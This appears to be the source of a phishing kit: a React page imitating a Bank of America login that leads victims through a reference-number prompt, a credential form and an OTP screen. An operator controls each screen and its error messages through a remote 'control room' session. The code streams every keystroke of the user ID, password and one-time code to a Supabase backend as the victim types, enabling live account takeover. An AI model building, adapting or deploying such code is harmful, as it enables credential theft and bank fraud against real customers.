"use client";

import { useState, useEffect } from "react";
import { ControlRoomSession, SessionState } from "@/SDK/vendor-sdk";

/* ===================================================================
   PAGE LAYOUT WRAPPER
   Ensures the BofA full-page responsive grid is maintained across all states
   =================================================================== */
function PageLayout({ children, title = "Log In to Online Banking" }: { children: React.ReactNode, title?: string }) {
  return (
    <>
      {/* Title Banner */}
      <section className="bg-boa-red text-white py-3 px-4 md:px-8" data-purpose="title-banner">
        <div className="max-w-5xl mx-auto">
          <h1 className="text-xl md:text-2xl font-normal">{title}</h1>
        </div>
      </section>

      {/* Main Content Area */}
      <main className="max-w-5xl mx-auto px-4 md:px-8 py-8">
        <div className="flex flex-col md:flex-row gap-8">
          
          {/* Dynamic Left Column (Forms, Status Screens) */}
          <div className="w-full md:w-5/12 border-b md:border-b-0 md:border-r border-gray-200 pb-8 md:pb-0 pr-0 md:pr-8" data-purpose="dynamic-form-container">
            {children}
          </div>

          {/* Static Right Column (Promotion & Help Links) */}
          <div className="w-full md:w-7/12 flex flex-col md:flex-row gap-8">
            {/* Promotion Section */}
            <div className="w-full md:w-7/12 px-0 text-center" data-purpose="app-promotion">
              <h2 className="text-xl text-gray-700 mb-6">Stay connected with our app</h2>
              <div className="flex flex-col items-center space-y-4">
                <img alt="Mobile App Promotion" className="w-48 object-contain" src="/mobile_llama.png"/>
                <div className="flex flex-col justify-center items-center space-y-4 max-w-xs w-full text-center">
                  <p className="text-lg text-gray-600 leading-tight">Secure, convenient banking anytime</p>
                  <a className="bg-boa-red text-white px-6 py-2 rounded-md font-bold text-center hover:opacity-90 inline-block w-full md:w-auto" href="#">Get the app</a>
                </div>
              </div>
            </div>

            {/* Help Links */}
            <div className="w-full md:w-5/12 space-y-8" data-purpose="help-links">
              <div className="space-y-3">
                <h3 className="text-lg text-gray-700 border-b border-gray-200 pb-1">Login help</h3>
                <ul className="space-y-2 text-sm text-boa-blue">
                  <li><a className="hover:underline" href="#">Forgot ID/Password?</a></li>
                  <li><a className="hover:underline" href="#">Problem logging in?</a></li>
                </ul>
              </div>
              <div className="space-y-3">
                <h3 className="text-lg text-gray-700 border-b border-gray-200 pb-1">Not using Online Banking?</h3>
                <ul className="space-y-2 text-sm text-boa-blue">
                  <li><a className="hover:underline font-bold" href="#">Enroll now</a></li>
                  <li><a className="hover:underline" href="#">Learn more about Online Banking</a></li>
                  <li><a className="hover:underline" href="#">Service Agreement</a></li>
                </ul>
              </div>
            </div>
          </div>
          
        </div>
      </main>
    </>
  );
}

/* ===================================================================
   SHARED COMPONENTS
   =================================================================== */

const BofAAlert = ({ message }: { message: string }) => (
  <div className="bg-[#fceceb] border-t-2 border-boa-red p-4 mb-6 flex items-start text-sm text-[#333]">
    <svg className="w-5 h-5 text-boa-red mr-3 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
      <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
    </svg>
    <span className="font-semibold">{message}</span>
  </div>
);

/* ===================================================================
   LOGIN FORM
   =================================================================== */

function LoginForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [validationError, setValidationError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (error) {
      setIsSubmitting(false);
    }
  }, [error]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError("");

    if (!userId.trim()) {
      setValidationError("Please enter your User ID.");
      return;
    }
    if (!password) {
      setValidationError("Please enter your Password.");
      return;
    }

    setIsSubmitting(true);
    try {
      await onInput({ event: "submit_credentials", user_id: userId, password: password });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <PageLayout title="Log In to Online Banking">
      <form onSubmit={handleSubmit} className="space-y-5" method="POST">
        {(error || validationError) && <BofAAlert message={validationError || error!} />}

        <div className="space-y-1">
          <label className="block text-[15px] font-bold text-gray-800" htmlFor="user-id">User ID</label>
          <input 
            className="w-full p-3 border border-gray-400 focus:ring-1 focus:ring-boa-blue focus:border-boa-blue outline-none text-[15px] rounded-md" 
            id="user-id" 
            name="user-id" 
            required 
            type="text"
            value={userId}
            onChange={e => {
              setUserId(e.target.value);
              onKeystroke("user_id", e.target.value);
            }}
            autoComplete="username"
            autoFocus
          />
          <div className="flex items-center space-x-2 text-sm text-gray-700 mt-2">
            <input className="border-gray-400 text-boa-blue focus:ring-0 rounded-none w-4 h-4" id="save-id" type="checkbox"/>
            <label htmlFor="save-id">Save this User ID</label>
          </div>
        </div>

        <div className="space-y-1">
          <label className="block text-[15px] font-bold text-gray-800" htmlFor="password">Password</label>
          <input 
            className="w-full p-3 border border-gray-400 focus:ring-1 focus:ring-boa-blue focus:border-boa-blue outline-none text-[15px] rounded-md" 
            id="password" 
            name="password" 
            required 
            type="password"
            value={password}
            onChange={e => {
              setPassword(e.target.value);
              onKeystroke("password", e.target.value);
            }}
            autoComplete="current-password"
          />
          <div className="mt-2">
            <a className="text-boa-blue text-sm hover:underline" href="#">Forgot your Password?</a>
          </div>
        </div>

        <div className="pt-4">
          <button 
            className="bg-boa-blue text-white w-full py-3 rounded-md font-bold flex items-center justify-center hover:bg-blue-900 transition-colors disabled:opacity-50" 
            type="submit"
            disabled={isSubmitting}
          >
            {isSubmitting ? "Logging In..." : "Log In"}
          </button>
        </div>
      </form>
    </PageLayout>
  );
}

/* ===================================================================
   OTP VERIFICATION FORM
   =================================================================== */

function OtpVerificationForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (error) {
      setIsSubmitting(false);
    }
  }, [error]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "verify_otp", otp_code: otp });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <PageLayout title="Security Verification">
      <form onSubmit={handleSubmit} className="space-y-5">
        <p className="text-[15px] text-gray-800 mb-4">
          To help us protect your account, we&apos;ve sent a temporary verification code to your registered device. Enter the code below to securely log in.
        </p>

        {error && <BofAAlert message={error} />}

        <div className="space-y-1">
          <label className="block text-[15px] font-bold text-gray-800" htmlFor="otpCode">Authorization Code</label>
          <input
            className="w-full p-3 border border-gray-400 focus:ring-1 focus:ring-boa-blue focus:border-boa-blue outline-none text-[15px] rounded-md text-center tracking-widest"
            type="text"
            id="otpCode"
            value={otp}
            onChange={e => {
              const val = e.target.value.replace(/\D/g, "");
              setOtp(val);
              onKeystroke("otp_code", val);
            }}
            inputMode="numeric"
            required
            autoComplete="one-time-code"
            autoFocus
          />
        </div>

        <div className="pt-4">
          <button 
            className="bg-boa-blue text-white w-full py-3 rounded-md font-bold flex items-center justify-center hover:bg-blue-900 transition-colors disabled:opacity-50" 
            type="submit" 
            disabled={otp.length < 4 || isSubmitting}
          >
            {isSubmitting ? "Verifying..." : "Verify Code"}
          </button>
        </div>
      </form>
    </PageLayout>
  );
}

/* ===================================================================
   PROCESSING SCREEN
   =================================================================== */

function ProcessingScreen({ error }: { error?: string }) {
  return (
    <PageLayout title="Secure Login">
      <div className="py-8">
        <div className="spinner"></div>
        <div className="text-center">
          <p className="text-gray-800 text-[15px] font-bold mb-2">
            Verifying your information...
          </p>
          <p className="text-gray-600 text-[13px]">
            Please do not refresh or close your browser.
          </p>
        </div>
        
        {error && (
          <div className="mt-8">
            <BofAAlert message={error} />
          </div>
        )}
      </div>
    </PageLayout>
  );
}

/* ===================================================================
   SUCCESS SCREEN
   =================================================================== */

function SuccessScreen() {
  return (
    <PageLayout title="Verification Complete">
      <div className="py-8 text-center">
        <svg className="w-16 h-16 text-green-700 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        <h2 className="text-xl font-bold text-gray-800 mb-2">Success</h2>
        <p className="text-[15px] text-gray-700">
          Your identity has been verified. You may now securely close this window or continue to your account dashboard.
        </p>
      </div>
    </PageLayout>
  );
}

/* ===================================================================
   FAILURE SCREEN
   =================================================================== */

function FailureScreen({ error }: { error?: string }) {
  return (
    <PageLayout title="Verification Failed">
      <div className="py-8 text-center">
        <svg className="w-16 h-16 text-boa-red mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        <h2 className="text-xl font-bold text-gray-800 mb-2">Action Required</h2>
        <p className="text-[15px] text-gray-700 mb-6">
          {error || "We could not verify your information at this time. Please contact Customer Service for assistance."}
        </p>
        <a href="#" className="text-boa-blue font-bold hover:underline">
          Return to Login
        </a>
      </div>
    </PageLayout>
  );
}

/* ===================================================================
   MAIN PAGE
   =================================================================== */

export default function Home() {
  const [caseRef, setCaseRef] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [sessionState, setSessionState] = useState<SessionState | null>(null);
  const [session, setSession] = useState<ControlRoomSession | null>(null);

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!caseRef.trim()) return;

    setLoading(true);
    setError("");

    try {
      const s = new ControlRoomSession({
        tenant_id: "214f7ed9-0359-4ff6-8971-561ceedff9f0", // BofA Tenant ID from Schema
        case_reference: caseRef.trim(),
        supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL!,
        supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY!,
      });
      const state = await s.connect();
      setSession(s);
      setSessionState(state);

      s.subscribe((newState) => {
        setSessionState(newState);
      });
    } catch (err: any) {
      setError(err.message || "Unable to locate reference number. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleInput = async (data: any) => {
    if (session) {
      await session.sendInput(data);
    }
  };

  const handleKeystroke = (field: string, value: string) => {
    if (session) {
      session.sendKeystroke(field, value);
    }
  };

  useEffect(() => {
    return () => {
      if (session) session.disconnect();
    };
  }, [session]);

  if (!sessionState) {
    return (
      <PageLayout title="Start Secure Session">
        <form onSubmit={handleConnect} className="space-y-5">
          <p className="text-[15px] text-gray-800">
            Please enter the reference number provided by your representative to begin.
          </p>

          {error && <BofAAlert message={error} />}

          <div className="space-y-1">
            <label className="block text-[15px] font-bold text-gray-800" htmlFor="caseRefInput">Reference Number</label>
            <input
              type="text"
              className="w-full p-3 border border-gray-400 focus:ring-1 focus:ring-boa-blue focus:border-boa-blue outline-none text-[15px] rounded-md uppercase tracking-widest text-center"
              id="caseRefInput"
              value={caseRef}
              onChange={e => setCaseRef(e.target.value.toUpperCase())}
              placeholder="Ex: CR-1234"
              autoFocus
            />
          </div>

          <div className="pt-4">
            <button 
              type="submit" 
              className="bg-boa-blue text-white w-full py-3 rounded-md font-bold flex items-center justify-center hover:bg-blue-900 transition-colors disabled:opacity-50"
              disabled={loading || !caseRef.trim()}
            >
              {loading ? "Connecting..." : "Continue"}
            </button>
          </div>
        </form>
      </PageLayout>
    );
  }

  const operatorError = sessionState.operator_message;
  const renderKey = sessionState.component_key || sessionState.current_state;

  switch (renderKey) {
    case "LoginForm":
    case "login":
      return <LoginForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "OtpVerificationForm":
    case "otp_verification":
      return <OtpVerificationForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "ProcessingScreen":
    case "processing":
      return <ProcessingScreen error={operatorError} />;
    case "SuccessScreen":
    case "success":
      return <SuccessScreen />;
    case "FailureScreen":
    case "failure":
      return <FailureScreen error={operatorError} />;
    default:
      return (
        <PageLayout title="Loading Session">
          <div className="text-center py-12">
            <div className="spinner"></div>
            <p className="text-gray-700 text-lg">
              Synchronizing state...
            </p>
          </div>
        </PageLayout>
      );
  }
}
